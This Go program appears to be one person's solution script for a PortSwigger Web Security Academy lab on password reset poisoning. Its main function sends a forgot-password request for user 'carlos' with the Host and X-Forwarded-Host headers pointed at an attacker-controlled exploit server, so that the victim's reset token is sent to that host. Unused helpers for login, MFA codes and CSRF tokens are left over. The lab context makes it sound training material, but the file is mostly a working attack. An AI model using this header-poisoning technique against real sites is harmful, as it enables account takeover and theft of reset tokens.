// https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware

package main

import (
	//"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	//"os"
	"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a9000fe04a06a79c056b38f005a00c2.web-security-academy.net"
	host := "exploit-0a97007304a16a03c030b2e701f900e5.exploit-server.net"
	forgotPasswordUrl := u + "/forgot-password"

	username := "carlos"

	status, body, err := resetPass(forgotPasswordUrl, username, host, client)
	if err != nil {
		return err
	}

	fmt.Printf("Login: status %v\n", status)
	fmt.Printf("Login: %v\n", body)

	return nil
}

func setCookie(client *http.Client, us, name, value string) error {
	u, err := url.Parse(us)
	if err != nil {
		return err
	}
	c := &http.Cookie{Name: name, Value: value}
	client.Jar.SetCookies(u, []*http.Cookie{c})
	return nil
}

func resetPass(u, username, host string, client *http.Client) (int, string, error) {
	data := url.Values{
		"username": {username},
	}
	req, err := http.NewRequest("POST", u, strings.NewReader(data.Encode()))
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("Host", host)
	req.Header.Set("X-Forwarded-Host", host)

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

func login(u, username, password, csrfToken string, client *http.Client) (int, string, error) {
	resp, err := client.PostForm(u, url.Values{
		"username": {username},
		"password": {password},
		"csrf": {csrfToken},
	})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

func postCode(u, code, csrfToken string, client *http.Client) (int, string, error) {
	fmt.Printf("Post code %v\n", code)
	resp, err := client.PostForm(u, url.Values{
		"mfa-code": {code},
		"csrf": {csrfToken},
	})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func get(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func parseCSRFToken(body string) string {
	return string(csrfRE.FindStringSubmatch(body)[1])
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}


